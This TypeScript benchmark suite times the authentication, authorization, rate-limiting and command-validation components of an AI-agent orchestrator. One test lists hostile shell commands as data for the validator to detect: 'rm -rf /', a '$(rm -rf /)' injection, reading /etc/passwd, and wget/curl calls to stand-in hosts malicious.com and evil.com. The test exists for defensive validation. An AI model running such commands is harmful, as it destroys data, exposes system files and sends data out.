/**
 * @fileoverview Security Component Performance Benchmarks
 *
 * ARBITER-013: Security Policy Enforcer Production Hardening
 *
 * Performance benchmarks for security components to ensure they meet production SLAs:
 * - Authentication latency < 100ms (P95)
 * - Authorization latency < 50ms (P95)
 * - Command validation latency < 25ms (P95)
 * - Rate limiting overhead < 10ms (P95)
 * - Memory usage under load < 100MB
 * - Concurrent request handling (1000+ requests/second)
 *
 * @author @darianrosebrook
 */

import {
  AuthCredentials,
  Permission,
  SecurityManager,
} from "../../src/orchestrator/SecurityManager";
import {
  AgentRegistrySecurity,
  AuditAction,
} from "../../src/security/AgentRegistrySecurity";
import { CommandValidator } from "../../src/security/CommandValidator";
import { AgentProfile, Specialization } from "../../src/types/agent-registry";

describe("Security Component Performance Benchmarks", () => {
  let securityManager: SecurityManager;
  let agentRegistrySecurity: AgentRegistrySecurity;
  let commandValidator: CommandValidator;

  const mockAgent: AgentProfile = {
    id: "perf-test-agent",
    name: "Performance Test Agent",
    modelFamily: "gpt-4",
    capabilities: {
      taskTypes: ["code-editing", "research"],
      languages: ["TypeScript", "Python"],
      specializations: ["Security audit", "API design"] as Specialization[],
    },
    performanceHistory: {
      successRate: 0.95,
      averageLatency: 2000,
      averageQuality: 0.9,
      taskCount: 100,
    },
    currentLoad: {
      activeTasks: 0,
      queuedTasks: 0,
      utilizationPercent: 0,
    },
    registeredAt: new Date().toISOString(),
    lastActiveAt: new Date().toISOString(),
  };

  const validCredentials: AuthCredentials = {
    agentId: "perf-test-agent",
    token: "valid-jwt-token-12345",
  };

  beforeEach(() => {
    // Initialize components with performance-optimized configurations
    securityManager = new SecurityManager({
      enabled: true,
      auditLogging: true,
    });
    securityManager.registerAgent(mockAgent);

    agentRegistrySecurity = new AgentRegistrySecurity({
      enableJwtValidation: false, // Use mock for consistent performance
      enableAuthorization: true,
      enableInputValidation: true,
      enableAuditLogging: true,
      rateLimitMaxRequests: 1000,
      rateLimitWindowMs: 60000,
    });

    commandValidator = new CommandValidator({
      allowlistPath: "tests/fixtures/test-allowlist.json",
      allowRelativePaths: true,
      maxCommandLength: 100,
      maxArgLength: 1000,
      sensitiveEnvPatterns: ["PASSWORD", "SECRET", "KEY"],
    });
  });

  describe("Authentication Performance", () => {
    it("should authenticate within 100ms (P95)", async () => {
      const iterations = 1000;
      const latencies: number[] = [];

      for (let i = 0; i < iterations; i++) {
        const startTime = performance.now();
        securityManager.authenticate(validCredentials);
        const endTime = performance.now();
        latencies.push(endTime - startTime);
      }

      // Calculate P95 latency
      latencies.sort((a, b) => a - b);
      const p95Index = Math.floor(iterations * 0.95);
      const p95Latency = latencies[p95Index];

      console.log(`Authentication P95 latency: ${p95Latency.toFixed(2)}ms`);
      expect(p95Latency).toBeLessThan(100);
    });

    it("should handle concurrent authentication requests efficiently", async () => {
      const concurrentRequests = 100;
      const startTime = performance.now();

      const promises = Array(concurrentRequests)
        .fill(null)
        .map(async (_, index) => {
          const creds = {
            ...validCredentials,
            agentId: `perf-test-agent-${index}`,
          };
          return securityManager.authenticate(creds);
        });

      const results = await Promise.all(promises);
      const endTime = performance.now();
      const totalTime = endTime - startTime;

      // All requests should succeed
      expect(results.every((r) => r !== null)).toBe(true);

      // Should handle 100 concurrent requests in reasonable time
      expect(totalTime).toBeLessThan(1000); // 1 second for 100 concurrent requests

      console.log(
        `Concurrent authentication (${concurrentRequests} requests): ${totalTime.toFixed(
          2
        )}ms`
      );
    });

    it("should maintain consistent performance under sustained load", async () => {
      const sustainedRequests = 5000;
      const latencies: number[] = [];
      const startTime = performance.now();

      for (let i = 0; i < sustainedRequests; i++) {
        const requestStart = performance.now();
        securityManager.authenticate(validCredentials);
        const requestEnd = performance.now();
        latencies.push(requestEnd - requestStart);
      }

      const endTime = performance.now();
      const totalTime = endTime - startTime;

      // Calculate performance metrics
      const avgLatency =
        latencies.reduce((a, b) => a + b, 0) / latencies.length;
      const maxLatency = Math.max(...latencies);
      const p95Latency = latencies.sort((a, b) => a - b)[
        Math.floor(sustainedRequests * 0.95)
      ];

      console.log(
        `Sustained load performance (${sustainedRequests} requests):`
      );
      console.log(`  Total time: ${totalTime.toFixed(2)}ms`);
      console.log(`  Average latency: ${avgLatency.toFixed(2)}ms`);
      console.log(`  Max latency: ${maxLatency.toFixed(2)}ms`);
      console.log(`  P95 latency: ${p95Latency.toFixed(2)}ms`);

      // Performance should remain consistent
      expect(avgLatency).toBeLessThan(50);
      expect(p95Latency).toBeLessThan(100);
      expect(maxLatency).toBeLessThan(200);
    });
  });

  describe("Authorization Performance", () => {
    it("should authorize within 50ms (P95)", async () => {
      const context = securityManager.authenticate(validCredentials)!;
      const iterations = 1000;
      const latencies: number[] = [];

      for (let i = 0; i < iterations; i++) {
        const startTime = performance.now();
        securityManager.authorize(context, Permission.SUBMIT_TASK);
        const endTime = performance.now();
        latencies.push(endTime - startTime);
      }

      // Calculate P95 latency
      latencies.sort((a, b) => a - b);
      const p95Index = Math.floor(iterations * 0.95);
      const p95Latency = latencies[p95Index];

      console.log(`Authorization P95 latency: ${p95Latency.toFixed(2)}ms`);
      expect(p95Latency).toBeLessThan(50);
    });

    it("should handle multiple permission checks efficiently", async () => {
      const context = securityManager.authenticate(validCredentials)!;
      const permissions = [
        Permission.SUBMIT_TASK,
        Permission.QUERY_OWN_TASKS,
        Permission.QUERY_SYSTEM_STATUS,
        Permission.UPDATE_OWN_PROGRESS,
      ];

      const iterations = 1000;
      const startTime = performance.now();

      for (let i = 0; i < iterations; i++) {
        for (const permission of permissions) {
          securityManager.authorize(context, permission);
        }
      }

      const endTime = performance.now();
      const totalTime = endTime - startTime;
      const avgTimePerCheck = totalTime / (iterations * permissions.length);

      console.log(
        `Multiple permission checks: ${avgTimePerCheck.toFixed(2)}ms per check`
      );
      expect(avgTimePerCheck).toBeLessThan(10);
    });
  });

  describe("Command Validation Performance", () => {
    it("should validate commands within 25ms (P95)", () => {
      const testCommands = [
        { cmd: "ls", args: ["-la"] },
        { cmd: "cat", args: ["file.txt"] },
        { cmd: "echo", args: ["hello", "world"] },
        { cmd: "grep", args: ["pattern", "file.txt"] },
        { cmd: "find", args: [".", "-name", "*.js"] },
      ];

      const iterations = 1000;
      const latencies: number[] = [];

      for (let i = 0; i < iterations; i++) {
        const testCmd = testCommands[i % testCommands.length];
        const startTime = performance.now();
        commandValidator.validateCommand(testCmd.cmd, testCmd.args);
        const endTime = performance.now();
        latencies.push(endTime - startTime);
      }

      // Calculate P95 latency
      latencies.sort((a, b) => a - b);
      const p95Index = Math.floor(iterations * 0.95);
      const p95Latency = latencies[p95Index];

      console.log(`Command validation P95 latency: ${p95Latency.toFixed(2)}ms`);
      expect(p95Latency).toBeLessThan(25);
    });

    it("should handle malicious command detection efficiently", () => {
      const maliciousCommands = [
        { cmd: "rm", args: ["-rf", "/"] },
        { cmd: "echo", args: ["$(rm -rf /)"] },
        { cmd: "cat", args: ["/etc/passwd"] },
        { cmd: "wget", args: ["http://malicious.com/script.sh"] },
        { cmd: "curl", args: ["-X", "POST", "http://evil.com"] },
      ];

      const iterations = 1000;
      const latencies: number[] = [];

      for (let i = 0; i < iterations; i++) {
        const testCmd = maliciousCommands[i % maliciousCommands.length];
        const startTime = performance.now();
        commandValidator.validateCommand(testCmd.cmd, testCmd.args);
        const endTime = performance.now();
        latencies.push(endTime - startTime);
      }

      // Calculate P95 latency
      latencies.sort((a, b) => a - b);
      const p95Index = Math.floor(iterations * 0.95);
      const p95Latency = latencies[p95Index];

      console.log(
        `Malicious command detection P95 latency: ${p95Latency.toFixed(2)}ms`
      );
      expect(p95Latency).toBeLessThan(25);
    });
  });

  describe("Rate Limiting Performance", () => {
    it("should enforce rate limits with minimal overhead (< 10ms P95)", async () => {
      const context = securityManager.authenticate(validCredentials)!;
      const iterations = 1000;
      const latencies: number[] = [];

      for (let i = 0; i < iterations; i++) {
        const startTime = performance.now();
        securityManager.checkRateLimit(context, "submitTask");
        const endTime = performance.now();
        latencies.push(endTime - startTime);
      }

      // Calculate P95 latency
      latencies.sort((a, b) => a - b);
      const p95Index = Math.floor(iterations * 0.95);
      const p95Latency = latencies[p95Index];

      console.log(`Rate limiting P95 latency: ${p95Latency.toFixed(2)}ms`);
      expect(p95Latency).toBeLessThan(10);
    });

    it("should handle rate limit enforcement under load", async () => {
      const context = securityManager.authenticate(validCredentials)!;
      const concurrentRequests = 100;
      const startTime = performance.now();

      const promises = Array(concurrentRequests)
        .fill(null)
        .map(async () => {
          return securityManager.checkRateLimit(context, "submitTask");
        });

      const results = await Promise.all(promises);
      const endTime = performance.now();
      const totalTime = endTime - startTime;

      // All rate limit checks should complete
      expect(results.every((r) => typeof r === "boolean")).toBe(true);

      // Should handle concurrent rate limit checks efficiently
      expect(totalTime).toBeLessThan(500); // 500ms for 100 concurrent checks

      console.log(
        `Concurrent rate limiting (${concurrentRequests} requests): ${totalTime.toFixed(
          2
        )}ms`
      );
    });
  });

  describe("Memory Usage Under Load", () => {
    it("should maintain memory usage under 100MB during sustained operations", async () => {
      const initialMemory = process.memoryUsage();
      const operations = 10000;

      // Perform sustained security operations
      for (let i = 0; i < operations; i++) {
        // Authentication
        securityManager.authenticate({
          ...validCredentials,
          agentId: `memory-test-agent-${i}`,
        });

        // Authorization
        const context = securityManager.authenticate(validCredentials);
        if (context) {
          securityManager.authorize(context, Permission.SUBMIT_TASK);
        }

        // Command validation
        commandValidator.validateCommand("ls", ["-la"]);

        // Rate limiting
        if (context) {
          securityManager.checkRateLimit(context, "submitTask");
        }

        // AgentRegistrySecurity operations
        await agentRegistrySecurity.authenticate(validCredentials.token);
      }

      const finalMemory = process.memoryUsage();
      const memoryIncrease = finalMemory.heapUsed - initialMemory.heapUsed;
      const memoryIncreaseMB = memoryIncrease / 1024 / 1024;

      console.log(`Memory usage increase: ${memoryIncreaseMB.toFixed(2)}MB`);
      console.log(
        `Final heap usage: ${(finalMemory.heapUsed / 1024 / 1024).toFixed(2)}MB`
      );

      // Memory increase should be reasonable
      expect(memoryIncreaseMB).toBeLessThan(100);
    });

    it("should clean up resources properly after operations", async () => {
      const initialMemory = process.memoryUsage();

      // Perform operations that should be cleaned up
      for (let i = 0; i < 1000; i++) {
        const context = securityManager.authenticate({
          ...validCredentials,
          agentId: `cleanup-test-agent-${i}`,
        });

        if (context) {
          securityManager.authorize(context, Permission.SUBMIT_TASK);
          securityManager.checkRateLimit(context, "submitTask");
        }
      }

      // Force garbage collection if available
      if (global.gc) {
        global.gc();
      }

      const finalMemory = process.memoryUsage();
      const memoryIncrease = finalMemory.heapUsed - initialMemory.heapUsed;
      const memoryIncreaseMB = memoryIncrease / 1024 / 1024;

      console.log(
        `Memory increase after cleanup: ${memoryIncreaseMB.toFixed(2)}MB`
      );

      // Memory should be cleaned up reasonably well
      expect(memoryIncreaseMB).toBeLessThan(50);
    });
  });

  describe("Concurrent Request Handling", () => {
    it("should handle 1000+ requests per second", async () => {
      const requestsPerSecond = 1000;
      const durationSeconds = 5;
      const totalRequests = requestsPerSecond * durationSeconds;

      const startTime = performance.now();
      const promises: Promise<any>[] = [];

      // Create requests at the target rate
      for (let i = 0; i < totalRequests; i++) {
        const promise = (async () => {
          const creds = {
            ...validCredentials,
            agentId: `concurrent-test-agent-${i}`,
          };
          return securityManager.authenticate(creds);
        })();

        promises.push(promise);

        // Rate limiting: wait if we're going too fast
        if (i % requestsPerSecond === 0 && i > 0) {
          const elapsed = performance.now() - startTime;
          const expectedElapsed = (i / requestsPerSecond) * 1000;
          if (elapsed < expectedElapsed) {
            await new Promise((resolve) =>
              setTimeout(resolve, expectedElapsed - elapsed)
            );
          }
        }
      }

      const results = await Promise.all(promises);
      const endTime = performance.now();
      const totalTime = endTime - startTime;
      const actualRPS = (totalRequests / totalTime) * 1000;

      console.log(`Concurrent request handling:`);
      console.log(`  Target RPS: ${requestsPerSecond}`);
      console.log(`  Actual RPS: ${actualRPS.toFixed(2)}`);
      console.log(`  Total time: ${totalTime.toFixed(2)}ms`);
      console.log(
        `  Success rate: ${(
          (results.filter((r) => r !== null).length / results.length) *
          100
        ).toFixed(2)}%`
      );

      // Should handle the target rate
      expect(actualRPS).toBeGreaterThan(requestsPerSecond * 0.8); // 80% of target
      expect(results.every((r) => r !== null)).toBe(true);
    });

    it("should maintain performance under mixed workload", async () => {
      const mixedOperations = 5000;
      const startTime = performance.now();

      const promises = Array(mixedOperations)
        .fill(null)
        .map(async (_, index) => {
          const operationType = index % 4;

          switch (operationType) {
            case 0: // Authentication
              return securityManager.authenticate({
                ...validCredentials,
                agentId: `mixed-test-agent-${index}`,
              });

            case 1: // Authorization
              const context = securityManager.authenticate(validCredentials);
              return context
                ? securityManager.authorize(context, Permission.SUBMIT_TASK)
                : false;

            case 2: // Command validation
              return commandValidator.validateCommand("ls", ["-la"]);

            case 3: // Rate limiting
              const rateLimitContext =
                securityManager.authenticate(validCredentials);
              return rateLimitContext
                ? securityManager.checkRateLimit(rateLimitContext, "submitTask")
                : false;

            default:
              return null;
          }
        });

      const _results = await Promise.all(promises);
      const endTime = performance.now();
      const totalTime = endTime - startTime;
      const avgTimePerOperation = totalTime / mixedOperations;

      console.log(`Mixed workload performance:`);
      console.log(`  Total operations: ${mixedOperations}`);
      console.log(`  Total time: ${totalTime.toFixed(2)}ms`);
      console.log(
        `  Average time per operation: ${avgTimePerOperation.toFixed(2)}ms`
      );

      // Should maintain reasonable performance
      expect(avgTimePerOperation).toBeLessThan(50);
      expect(totalTime).toBeLessThan(10000); // 10 seconds for 5000 operations
    });
  });

  describe("End-to-End Security Pipeline Performance", () => {
    it("should complete full security pipeline within 200ms (P95)", async () => {
      const iterations = 1000;
      const latencies: number[] = [];

      for (let i = 0; i < iterations; i++) {
        const startTime = performance.now();

        // Complete security pipeline
        const context = securityManager.authenticate(validCredentials);
        if (context) {
          securityManager.authorize(context, Permission.SUBMIT_TASK);
          securityManager.checkRateLimit(context, "submitTask");
        }

        const registryContext = await agentRegistrySecurity.authenticate(
          validCredentials.token
        );
        if (registryContext) {
          await agentRegistrySecurity.authorize(
            registryContext,
            AuditAction.READ,
            "agent",
            "perf-test-agent"
          );
        }

        commandValidator.validateCommand("ls", ["-la"]);

        const endTime = performance.now();
        latencies.push(endTime - startTime);
      }

      // Calculate P95 latency
      latencies.sort((a, b) => a - b);
      const p95Index = Math.floor(iterations * 0.95);
      const p95Latency = latencies[p95Index];

      console.log(
        `End-to-end security pipeline P95 latency: ${p95Latency.toFixed(2)}ms`
      );
      expect(p95Latency).toBeLessThan(200);
    });

    it("should handle concurrent full security pipelines", async () => {
      const concurrentPipelines = 50;
      const startTime = performance.now();

      const promises = Array(concurrentPipelines)
        .fill(null)
        .map(async (_, index) => {
          const creds = {
            ...validCredentials,
            agentId: `pipeline-test-agent-${index}`,
          };

          // Complete security pipeline
          const context = securityManager.authenticate(creds);
          if (context) {
            securityManager.authorize(context, Permission.SUBMIT_TASK);
            securityManager.checkRateLimit(context, "submitTask");
          }

          const registryContext = await agentRegistrySecurity.authenticate(
            creds.token
          );
          if (registryContext) {
            await agentRegistrySecurity.authorize(
              registryContext,
              AuditAction.READ,
              "agent",
              creds.agentId
            );
          }

          const validationResult = commandValidator.validateCommand("ls", [
            "-la",
          ]);

          return {
            context: context !== null,
            registryContext: registryContext !== null,
            validationResult: validationResult.valid,
          };
        });

      const results = await Promise.all(promises);
      const endTime = performance.now();
      const totalTime = endTime - startTime;

      // All pipelines should complete successfully
      expect(
        results.every(
          (r) => r.context && r.registryContext && r.validationResult
        )
      ).toBe(true);

      // Should handle concurrent pipelines efficiently
      expect(totalTime).toBeLessThan(2000); // 2 seconds for 50 concurrent pipelines

      console.log(
        `Concurrent security pipelines (${concurrentPipelines}): ${totalTime.toFixed(
          2
        )}ms`
      );
    });
  });
});
